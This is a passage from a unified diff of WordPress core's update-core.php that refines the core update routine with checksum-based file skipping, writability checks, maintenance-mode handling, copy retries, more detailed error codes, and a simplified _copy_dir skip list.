+'wp-includes/js/jquery/ui/jquery.ui.effect-drop.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-explode.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-fade.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-fold.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-highlight.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-pulsate.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-scale.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-shake.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-slide.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect-transfer.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.effect.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.menu.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.mouse.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.position.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.progressbar.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.resizable.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.selectable.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.slider.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.sortable.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.spinner.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.tabs.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.tooltip.min.js',
+'wp-includes/js/jquery/ui/jquery.ui.widget.min.js',
 );
 
 /**
@@ -558,10 +716,13 @@ $_old_files = array(
 global $_new_bundled_files;
 
 $_new_bundled_files = array(
-'plugins/akismet/' => '2.0',
-'themes/twentyten/' => '3.0',
-'themes/twentyeleven/' => '3.2',
-'themes/twentytwelve/' => '3.5',
+	'plugins/akismet/'       => '2.0',
+	'themes/twentyten/'      => '3.0',
+	'themes/twentyeleven/'   => '3.2',
+	'themes/twentytwelve/'   => '3.5',
+	'themes/twentythirteen/' => '3.6',
+	'themes/twentyfourteen/' => '3.8',
+	'themes/twentyfifteen/'  => '4.1',
 );
 
 /**
@@ -615,8 +776,26 @@ function update_core($from, $to) {
 
 	@set_time_limit( 300 );
 
-	// Sanity check the unzipped distribution
-	apply_filters( 'update_feedback', __('Verifying the unpacked files&#8230;') );
+	/**
+	 * Filter feedback messages displayed during the core update process.
+	 *
+	 * The filter is first evaluated after the zip file for the latest version
+	 * has been downloaded and unzipped. It is evaluated five more times during
+	 * the process:
+	 *
+	 * 1. Before WordPress begins the core upgrade process.
+	 * 2. Before Maintenance Mode is enabled.
+	 * 3. Before WordPress begins copying over the necessary files.
+	 * 4. Before Maintenance Mode is disabled.
+	 * 5. Before the database is upgraded.
+	 *
+	 * @since 2.5.0
+	 *
+	 * @param string $feedback The core update feedback messages.
+	 */
+	apply_filters( 'update_feedback', __( 'Verifying the unpacked files&#8230;' ) );
+
+	// Sanity check the unzipped distribution.
 	$distro = '';
 	$roots = array( '/wordpress/', '/wordpress-mu/' );
 	foreach ( $roots as $root ) {
@@ -634,12 +813,12 @@ function update_core($from, $to) {
 	// $wp_filesystem->wp_content_dir() returned unslashed pre-2.8
 	$versions_file = trailingslashit( $wp_filesystem->wp_content_dir() ) . 'upgrade/version-current.php';
 	if ( ! $wp_filesystem->copy( $from . $distro . 'wp-includes/version.php', $versions_file ) ) {
-		 $wp_filesystem->delete( $from, true );
-		 return new WP_Error( 'copy_failed', __('Could not copy file.') );
+		$wp_filesystem->delete( $from, true );
+		return new WP_Error( 'copy_failed_for_version_file', __( 'The update cannot be installed because we will be unable to copy some files. This is usually due to inconsistent file permissions.' ), 'wp-includes/version.php' );
 	}
 
 	$wp_filesystem->chmod( $versions_file, FS_CHMOD_FILE );
-	require_once( WP_CONTENT_DIR . '/upgrade/version-current.php' );
+	require( WP_CONTENT_DIR . '/upgrade/version-current.php' );
 	$wp_filesystem->delete( $versions_file );
 
 	$php_version    = phpversion();
@@ -662,16 +841,117 @@ function update_core($from, $to) {
 	elseif ( !$mysql_compat )
 		return new WP_Error( 'mysql_not_compatible', sprintf( __('The update cannot be installed because WordPress %1$s requires MySQL version %2$s or higher. You are running version %3$s.'), $wp_version, $required_mysql_version, $mysql_version ) );
 
-	apply_filters('update_feedback', __('Installing the latest version&#8230;'));
+	/** This filter is documented in wp-admin/includes/update-core.php */
+	apply_filters( 'update_feedback', __( 'Preparing to install the latest version&#8230;' ) );
 
+	// Don't copy wp-content, we'll deal with that below
+	// We also copy version.php last so failed updates report their old version
+	$skip = array( 'wp-content', 'wp-includes/version.php' );
+	$check_is_writable = array();
+
+	// Check to see which files don't really need updating - only available for 3.7 and higher
+	if ( function_exists( 'get_core_checksums' ) ) {
+		// Find the local version of the working directory
+		$working_dir_local = WP_CONTENT_DIR . '/upgrade/' . basename( $from ) . $distro;
+
+		$checksums = get_core_checksums( $wp_version, isset( $wp_local_package ) ? $wp_local_package : 'en_US' );
+		if ( is_array( $checksums ) && isset( $checksums[ $wp_version ] ) )
+			$checksums = $checksums[ $wp_version ]; // Compat code for 3.7-beta2
+		if ( is_array( $checksums ) ) {
+			foreach( $checksums as $file => $checksum ) {
+				if ( 'wp-content' == substr( $file, 0, 10 ) )
+					continue;
+				if ( ! file_exists( ABSPATH . $file ) )
+					continue;
+				if ( ! file_exists( $working_dir_local . $file ) )
+					continue;
+				if ( md5_file( ABSPATH . $file ) === $checksum )
+					$skip[] = $file;
+				else
+					$check_is_writable[ $file ] = ABSPATH . $file;
+			}
+		}
+	}
+
+	// If we're using the direct method, we can predict write failures that are due to permissions.
+	if ( $check_is_writable && 'direct' === $wp_filesystem->method ) {
+		$files_writable = array_filter( $check_is_writable, array( $wp_filesystem, 'is_writable' ) );
+		if ( $files_writable !== $check_is_writable ) {
+			$files_not_writable = array_diff_key( $check_is_writable, $files_writable );
+			foreach ( $files_not_writable as $relative_file_not_writable => $file_not_writable ) {
+				// If the writable check failed, chmod file to 0644 and try again, same as copy_dir().
+				$wp_filesystem->chmod( $file_not_writable, FS_CHMOD_FILE );
+				if ( $wp_filesystem->is_writable( $file_not_writable ) )
+					unset( $files_not_writable[ $relative_file_not_writable ] );
+			}
+
+			// Store package-relative paths (the key) of non-writable files in the WP_Error object.
+			$error_data = version_compare( $old_wp_version, '3.7-beta2', '>' ) ? array_keys( $files_not_writable ) : '';
+
+			if ( $files_not_writable )
+				return new WP_Error( 'files_not_writable', __( 'The update cannot be installed because we will be unable to copy some files. This is usually due to inconsistent file permissions.' ), implode( ', ', $error_data ) );
+		}
+	}
+
+	/** This filter is documented in wp-admin/includes/update-core.php */
+	apply_filters( 'update_feedback', __( 'Enabling Maintenance mode&#8230;' ) );
 	// Create maintenance file to signal that we are upgrading
 	$maintenance_string = '<?php $upgrading = ' . time() . '; ?>';
 	$maintenance_file = $to . '.maintenance';
 	$wp_filesystem->delete($maintenance_file);
 	$wp_filesystem->put_contents($maintenance_file, $maintenance_string, FS_CHMOD_FILE);
 
+	/** This filter is documented in wp-admin/includes/update-core.php */
+	apply_filters( 'update_feedback', __( 'Copying the required files&#8230;' ) );
 	// Copy new versions of WP files into place.
-	$result = _copy_dir($from . $distro, $to, array('wp-content') );
+	$result = _copy_dir( $from . $distro, $to, $skip );
+	if ( is_wp_error( $result ) )
+		$result = new WP_Error( $result->get_error_code(), $result->get_error_message(), substr( $result->get_error_data(), strlen( $to ) ) );
+
+	// Since we know the core files have copied over, we can now copy the version file
+	if ( ! is_wp_error( $result ) ) {
+		if ( ! $wp_filesystem->copy( $from . $distro . 'wp-includes/version.php', $to . 'wp-includes/version.php', true /* overwrite */ ) ) {
+			$wp_filesystem->delete( $from, true );
+			$result = new WP_Error( 'copy_failed_for_version_file', __( 'The update cannot be installed because we will be unable to copy some files. This is usually due to inconsistent file permissions.' ), 'wp-includes/version.php' );
+		}
+		$wp_filesystem->chmod( $to . 'wp-includes/version.php', FS_CHMOD_FILE );
+	}
+
+	// Check to make sure everything copied correctly, ignoring the contents of wp-content
+	$skip = array( 'wp-content' );
+	$failed = array();
+	if ( isset( $checksums ) && is_array( $checksums ) ) {
+		foreach ( $checksums as $file => $checksum ) {
+			if ( 'wp-content' == substr( $file, 0, 10 ) )
+				continue;
+			if ( ! file_exists( $working_dir_local . $file ) )
+				continue;
+			if ( file_exists( ABSPATH . $file ) && md5_file( ABSPATH . $file ) == $checksum )
+				$skip[] = $file;
+			else
+				$failed[] = $file;
+		}
+	}
+
+	// Some files didn't copy properly
+	if ( ! empty( $failed ) ) {
+		$total_size = 0;
+		foreach ( $failed as $file ) {
+			if ( file_exists( $working_dir_local . $file ) )
+				$total_size += filesize( $working_dir_local . $file );
+		}
+
+		// If we don't have enough free space, it isn't worth trying again.
+		// Unlikely to be hit due to the check in unzip_file().
+		$available_space = @disk_free_space( ABSPATH );
+		if ( $available_space && $total_size >= $available_space ) {
+			$result = new WP_Error( 'disk_full', __( 'There is not enough free disk space to complete the update.' ) );
+		} else {
+			$result = _copy_dir( $from . $distro, $to, $skip );
+			if ( is_wp_error( $result ) )
+				$result = new WP_Error( $result->get_error_code() . '_retry', $result->get_error_message(), substr( $result->get_error_data(), strlen( $to ) ) );
+		}
+	}
 
 	// Custom Content Directory needs updating now.
 	// Copy Languages
@@ -688,17 +968,23 @@ function update_core($from, $to) {
 
 		if ( @is_dir($lang_dir) ) {
 			$wp_lang_dir = $wp_filesystem->find_folder($lang_dir);
-			if ( $wp_lang_dir )
+			if ( $wp_lang_dir ) {
 				$result = copy_dir($from . $distro . 'wp-content/languages/', $wp_lang_dir);
+				if ( is_wp_error( $result ) )
+					$result = new WP_Error( $result->get_error_code() . '_languages', $result->get_error_message(), substr( $result->get_error_data(), strlen( $wp_lang_dir ) ) );
+			}
 		}
 	}
+
+	/** This filter is documented in wp-admin/includes/update-core.php */
+	apply_filters( 'update_feedback', __( 'Disabling Maintenance mode&#8230;' ) );
+	// Remove maintenance file, we're done with potential site-breaking changes
+	$wp_filesystem->delete( $maintenance_file );
 
 	// 3.5 -> 3.5+ - an empty twentytwelve directory was created upon upgrade to 3.5 for some users, preventing installation of Twenty Twelve.
 	if ( '3.5' == $old_wp_version ) {
 		if ( is_dir( WP_CONTENT_DIR . '/themes/twentytwelve' ) && ! file_exists( WP_CONTENT_DIR . '/themes/twentytwelve/style.css' )  ) {
-			// Bumping the introduced version to 3.5.1 for the affected users causes Twenty Twelve to be installed for the first time
-			if ( $wp_filesystem->delete( $wp_filesystem->wp_themes_dir() . 'twentytwelve/' ) )
-				$_new_bundled_files[ 'themes/twentytwelve/' ] = '3.5.1';
+			$wp_filesystem->delete( $wp_filesystem->wp_themes_dir() . 'twentytwelve/' );
 		}
 	}
 
@@ -728,15 +1014,20 @@ function update_core($from, $to) {
 						continue;
 
 					if ( ! $wp_filesystem->copy($from . $distro . 'wp-content/' . $file, $dest . $filename, FS_CHMOD_FILE) )
-						$result = new WP_Error('copy_failed', __('Could not copy file.'), $dest . $filename);
+						$result = new WP_Error( "copy_failed_for_new_bundled_$type", __( 'Could not copy file.' ), $dest . $filename );
 				} else {
 					if ( ! $development_build && $wp_filesystem->is_dir( $dest . $filename ) )
 						continue;
 
 					$wp_filesystem->mkdir($dest . $filename, FS_CHMOD_DIR);
 					$_result = copy_dir( $from . $distro . 'wp-content/' . $file, $dest . $filename);
-					if ( is_wp_error($_result) ) //If a error occurs partway through this final step, keep the error flowing through, but keep process going.
-						$result = $_result;
+
+					// If a error occurs partway through this final step, keep the error flowing through, but keep process going.
+					if ( is_wp_error( $_result ) ) {
+						if ( ! is_wp_error( $result ) )
+							$result = new WP_Error;
+						$result->add( $_result->get_error_code() . "_$type", $_result->get_error_message(), substr( $_result->get_error_data(), strlen( $dest ) ) );
+					}
 				}
 			}
 		} //end foreach
@@ -744,7 +1035,6 @@ function update_core($from, $to) {
 
 	// Handle $result error from the above blocks
 	if ( is_wp_error($result) ) {
-		$wp_filesystem->delete($maintenance_file);
 		$wp_filesystem->delete($from, true);
 		return $result;
 	}
@@ -758,9 +1048,15 @@ function update_core($from, $to) {
 	}
 
 	// Upgrade DB with separate request
-	apply_filters('update_feedback', __('Upgrading database&#8230;'));
+	/** This filter is documented in wp-admin/includes/update-core.php */
+	apply_filters( 'update_feedback', __( 'Upgrading database&#8230;' ) );
 	$db_upgrade_url = admin_url('upgrade.php?step=upgrade_db');
 	wp_remote_post($db_upgrade_url, array('timeout' => 60));
+
+	// Clear the cache to prevent an update_option() from saving a stale db_version to the cache
+	wp_cache_flush();
+	// (Not all cache backends listen to 'flush')
+	wp_cache_delete( 'alloptions', 'options' );
 
 	// Remove working directory
 	$wp_filesystem->delete($from, true);
@@ -771,11 +1067,18 @@ function update_core($from, $to) {
 	else
 		delete_option('update_core');
 
-	// Remove maintenance file, we're done.
-	$wp_filesystem->delete($maintenance_file);
-
-	// If we made it this far:
+	/**
+	 * Fires after WordPress core has been successfully updated.
+	 *
+	 * @since 3.3.0
+	 *
+	 * @param string $wp_version The current WordPress version.
+	 */
 	do_action( '_core_updated_successfully', $wp_version );
+
+	// Clear the option that blocks auto updates after failures, now that we've been successful.
+	if ( function_exists( 'delete_site_option' ) )
+		delete_site_option( 'auto_core_update_failed' );
 
 	return $wp_version;
 }
@@ -784,10 +1087,12 @@ function update_core($from, $to) {
  * Copies a directory from one location to another via the WordPress Filesystem Abstraction.
  * Assumes that WP_Filesystem() has already been called and setup.
  *
- * This is a temporary function for the 3.1 -> 3.2 upgrade only and will be removed in 3.3
+ * This is a temporary function for the 3.1 -> 3.2 upgrade, as well as for those upgrading to
+ * 3.7+
  *
  * @ignore
  * @since 3.2.0
+ * @since 3.7.0 Updated not to use a regular expression for the skip list
  * @see copy_dir()
  *
  * @param string $from source directory
@@ -803,31 +1108,34 @@ function _copy_dir($from, $to, $skip_list = array() ) {
 	$from = trailingslashit($from);
 	$to = trailingslashit($to);
 
-	$skip_regex = '';
-	foreach ( (array)$skip_list as $key => $skip_file )
-		$skip_regex .= preg_quote($skip_file, '!') . '|';
-
-	if ( !empty($skip_regex) )
-		$skip_regex = '!(' . rtrim($skip_regex, '|') . ')$!i';
-
 	foreach ( (array) $dirlist as $filename => $fileinfo ) {
-		if ( !empty($skip_regex) )
-			if ( preg_match($skip_regex, $from . $filename) )
-				continue;
+		if ( in_array( $filename, $skip_list ) )
+			continue;
 
 		if ( 'f' == $fileinfo['type'] ) {
 			if ( ! $wp_filesystem->copy($from . $filename, $to . $filename, true, FS_CHMOD_FILE) ) {
 				// If copy failed, chmod file to 0644 and try again.
-				$wp_filesystem->chmod($to . $filename, 0644);
+				$wp_filesystem->chmod( $to . $filename, FS_CHMOD_FILE );
 				if ( ! $wp_filesystem->copy($from . $filename, $to . $filename, true, FS_CHMOD_FILE) )
-					return new WP_Error('copy_failed', __('Could not copy file.'), $to . $filename);
+					return new WP_Error( 'copy_failed__copy_dir', __( 'Could not copy file.' ), $to . $filename );
 			}
 		} elseif ( 'd' == $fileinfo['type'] ) {
 			if ( !$wp_filesystem->is_dir($to . $filename) ) {
 				if ( !$wp_filesystem->mkdir($to . $filename, FS_CHMOD_DIR) )
-					return new WP_Error('mkdir_failed', __('Could not create directory.'), $to . $filename);
+					return new WP_Error( 'mkdir_failed__copy_dir', __( 'Could not create directory.' ), $to . $filename );
 			}
-			$result = _copy_dir($from . $filename, $to . $filename, $skip_list);
+
+			/*
+			 * Generate the $sub_skip_list for the subdirectory as a sub-set
+			 * of the existing $skip_list.
+			 */
+			$sub_skip_list = array();
+			foreach ( $skip_list as $skip_item ) {
+				if ( 0 === strpos( $skip_item, $filename . '/' ) )
+					$sub_skip_list[] = preg_replace( '!^' . preg_quote( $filename, '!' ) . '/!i', '', $skip_item );
+			}
+
+			$result = _copy_dir($from . $filename, $to . $filename, $sub_skip_list);
 			if ( is_wp_error($result) )
 				return $result;
 		}
@@ -849,14 +1157,14 @@ function _redirect_to_about_wordpress( $new_version ) {
 	if ( version_compare( $wp_version, '3.4-RC1', '>=' ) )
 		return;
 
-	// Ensure we only run this on the update-core.php page. wp_update_core() could be called in other contexts.
+	// Ensure we only run this on the update-core.php page. The Core_Upgrader may be used in other contexts.
 	if ( 'update-core.php' != $pagenow )
 		return;
 
  	if ( 'do-core-upgrade' != $action && 'do-core-reinstall' != $action )
  		return;
 
-	// Load the updated default text localization domain for new strings
+	// Load the updated default text localization domain for new strings.
 	load_default_textdomain();
 
 	// See do_core_upgrade()
@@ -872,7 +1180,7 @@ window.location = 'about.php?updated';
 </script>
 	<?php
 
-	// Include admin-footer.php and exit
+	// Include admin-footer.php and exit.
 	include(ABSPATH . 'wp-admin/admin-footer.php');
 	exit();
 }
